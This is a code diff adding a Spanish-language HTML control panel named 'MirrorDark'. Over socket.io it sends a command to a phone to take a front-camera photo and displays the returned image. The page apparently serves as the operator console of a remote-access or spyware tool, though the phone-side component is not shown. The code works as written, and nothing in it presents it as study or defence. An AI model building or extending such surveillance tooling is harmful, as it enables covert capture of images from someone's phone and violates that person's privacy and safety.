@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>MirrorDark - Panel de Control</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #121212; color: #fff; text-align: center; padding: 40px; }
+        button { padding: 12px 24px; font-size: 16px; margin: 10px; cursor: pointer; background: #ff4757; color: white; border: none; border-radius: 5px; }
+        button:hover { background: #ff6b81; }
+        #screen-view { max-width: 400px; margin-top: 20px; border: 2px solid #333; border-radius: 8px; }
+    </style>
+</head>
+<body>
+
+    <h1>MirrorDark - Panel de Control</h1>
+    <p>Estado del servidor: <span id="status" style="color: yellow;">Conectando...</span></p>
+
+    <div>
+        <button onclick="sendCommand('get_photo')">Tomar Foto (Cámara Frontal)</button>
+    </div>
+
+    <div>
+        <h3>Vista previa:</h3>
+        <img id="screen-view" src="" alt="Esperando respuesta del celular..." />
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        const statusSpan = document.getElementById('status');
+        const screenView = document.getElementById('screen-view');
+
+        socket.on('connect', () => {
+            statusSpan.textContent = 'Conectado';
+            statusSpan.style.color = 'lightgreen';
+        });
+
+        function sendCommand(action) {
+            console.log("Enviando orden:", action);
+            socket.emit('command_to_phone', { action: action });
+        }
+
+        socket.on('phone_response', (data) => {
+            if (data.type === 'photo') {
+                screenView.src = `data:image/jpeg;base64,${data.image}`;
+            }
+        });
+    </script>
+</body>
+</html>
